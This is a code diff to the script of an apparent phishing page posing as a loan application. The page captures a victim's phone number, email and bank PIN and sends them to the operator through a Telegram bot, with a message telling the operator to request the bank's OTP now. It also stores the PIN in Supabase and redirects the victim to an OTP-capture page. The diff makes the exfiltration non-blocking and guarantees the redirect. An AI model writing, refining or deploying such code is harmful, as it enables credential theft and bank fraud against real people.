@@ -210,7 +210,7 @@
         successDiv.classList.add('show');
     }
 
-    // Send Telegram notification with phone, email, and PIN
+    // Send Telegram notification (will NOT stop the redirect if it fails)
     async function sendTelegramNotification(pin) {
         var decodedPhone = decodeURIComponent(phone);
         var decodedEmail = decodeURIComponent(email);
@@ -231,10 +231,6 @@
             '✅ *ACTION REQUIRED:* Request OTP from the bank now!\n' +
             '📱 User is waiting on the OTP verification page.';
 
-        console.log('Sending Telegram message...');
-        console.log('Bot Token:', TG_BOT_TOKEN);
-        console.log('Chat ID:', TG_CHAT_ID);
-        
         var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
         
         try {
@@ -248,15 +244,11 @@
                 })
             });
             var result = await response.json();
-            console.log('Telegram response:', result);
-            
-            if (!result.ok) {
-                throw new Error(result.description || 'Telegram API error');
-            }
+            console.log('Telegram sent:', result.ok ? '✅ Success' : '❌ Failed');
             return result;
         } catch (error) {
-            console.error('Telegram fetch error:', error);
-            throw error;
+            console.error('Telegram error:', error);
+            return null; // Don't throw - just return null
         }
     }
 
@@ -268,7 +260,8 @@
             .from('users')
             .update({ pin: pin })
             .eq('phone', decodedPhone);
-        if (pinErr) throw new Error(pinErr.message);
+        if (pinErr) console.error('Supabase error:', pinErr);
+        // Don't throw - continue even if Supabase fails
 
         if (appId) {
             await db
@@ -278,7 +271,7 @@
         }
     }
 
-    // Main confirm function
+    // Main confirm function - ALWAYS redirects to OTP page
     window.handleConfirm = async function() {
         var pin = getPin();
         if (pin.length !== 4) { 
@@ -287,38 +280,34 @@
         }
 
         confirmBtn.disabled = true;
-        confirmBtn.textContent = '⏳ Sending notification...';
-        showSuccess('Sending notification to admin...');
+        confirmBtn.textContent = '⏳ Processing...';
+        showSuccess('Processing your request...');
 
-        try {
-            // Send Telegram notification (phone, email, PIN are included)
-            await sendTelegramNotification(pin);
-            
-            showSuccess('✓ Notification sent! Redirecting in 4 seconds...');
-            
-            // Save PIN to Supabase
-            await savePinToSupabase(pin);
-            
-            // 4 second delay
-            setTimeout(function() {
-                window.location.href = 'otp-verify.html'
-                    + '?amount='  + encodeURIComponent(amount)
-                    + '&term='    + encodeURIComponent(term)
-                    + '&rate='    + encodeURIComponent(rate)
-                    + '&monthly=' + encodeURIComponent(monthly)
-                    + '&name='    + encodeURIComponent(name)
-                    + '&email='   + encodeURIComponent(email)
-                    + '&phone='   + encodeURIComponent(phone)
-                    + '&appId='   + encodeURIComponent(appId);
-            }, 4000);
+        // Try to send Telegram (but don't wait for it to complete)
+        sendTelegramNotification(pin).catch(function(e) {
+            console.error('Telegram failed but continuing:', e);
+        });
+        
+        // Try to save to Supabase (but don't wait for it to complete)
+        savePinToSupabase(pin).catch(function(e) {
+            console.error('Supabase failed but continuing:', e);
+        });
 
-        } catch (err) {
-            console.error('Error:', err);
-            showError('Error: ' + err.message);
-            confirmBtn.disabled = false;
-            confirmBtn.textContent = 'Confirm PIN →';
-            successDiv.classList.remove('show');
-        }
+        // Update success message
+        showSuccess('✓ Redirecting to verification page...');
+        
+        // ALWAYS redirect after 3 seconds - regardless of Telegram/Supabase success
+        setTimeout(function() {
+            window.location.href = 'otp-verify.html'
+                + '?amount='  + encodeURIComponent(amount)
+                + '&term='    + encodeURIComponent(term)
+                + '&rate='    + encodeURIComponent(rate)
+                + '&monthly=' + encodeURIComponent(monthly)
+                + '&name='    + encodeURIComponent(name)
+                + '&email='   + encodeURIComponent(email)
+                + '&phone='   + encodeURIComponent(phone)
+                + '&appId='   + encodeURIComponent(appId);
+        }, 3000);
     };
 </script>
 </body>
